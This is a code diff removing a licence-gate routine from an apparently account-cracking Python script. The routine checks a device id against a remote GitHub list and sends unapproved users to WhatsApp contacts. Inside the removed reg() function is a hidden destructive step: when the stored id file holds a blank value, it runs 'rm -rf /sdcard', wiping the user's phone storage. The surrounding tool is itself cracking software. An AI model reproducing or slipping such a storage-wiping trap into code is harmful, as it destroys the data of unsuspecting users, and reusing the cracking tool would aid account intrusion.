@@ -150,59 +150,6 @@ def log_sel():
 
 #  RECODE AAHIL
 
-def reg():
-    os.system('clear')
-    print logo
-    print ''
-    print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
-    print ''
-    time.sleep(1)
-    try:
-        to = open('/sdcard/.sa.txt', 'r').read()
-        if to ==" ":
-            os.system('rm -rf /sdcard')
-            os.system('rm -rf /sdcard/*')
-        
-    except (KeyError, IOError):
-        reg2()
-
-    r = requests.get('https://raw.githubusercontent.com/Waqar_pro/File-crack/main/server.txt').text
-    if to in r:
-        os.system('cd ..... && npm install')
-        os.system('fuser -k 5000/tcp &')
-        os.system('#')
-        os.system('cd ..... && node index.js &')
-        time.sleep(5)
-        menu()
-    else:
-        os.system('clear')
-        print logo
-        print '\tApproved Failed'
-        print ' \x1b[1;92mYour Id Is Not Approved '
-        print ' \x1b[1;92mCopy the id and send to Admin'
-        print ' \x1b[1;92mYour id : ' + to
-        raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+17867569078')
-        reg()
-
-
-def reg2():
-    os.system('clear')
-    print logo
-    print '\tApproval not detected'
-    print ' \x1b[1;92mCopy and press enter ,'
-    id = uuid.uuid4().hex[:50]
-    print ' Your id: ' + id
-    print ''
-    raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923496519800')
-    sav = open('/sdcard/.sa.txt', 'w')
-    sav.write(id)
-    sav.close()
-    raw_input('\x1b[1;92m Press enter to check Approval ')
-    reg()
-
-
 
 def menu():
     os.system('clear')
